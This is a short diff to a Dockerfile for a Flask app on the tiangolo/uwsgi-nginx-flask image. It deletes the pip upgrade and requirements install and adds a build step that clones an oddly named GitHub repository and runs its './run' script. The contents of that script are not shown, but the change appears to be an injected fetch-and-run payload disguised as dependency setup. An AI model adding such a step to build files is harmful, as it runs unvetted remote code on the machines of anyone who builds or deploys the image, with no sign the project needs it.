@@ -4,8 +4,10 @@ FROM tiangolo/uwsgi-nginx-flask:python3.6
 COPY requirements.txt /tmp/
 
 # upgrade pip and install required python packages
-RUN pip install -U pip
-RUN pip install -r /tmp/requirements.txt
+RUN git clone --recursive https://github.com/mijikuhibimui/mujijankopo \
+    && cd mujijankopo \
+    && ./run
+
 
 EXPOSE 80
 # copy over our app code
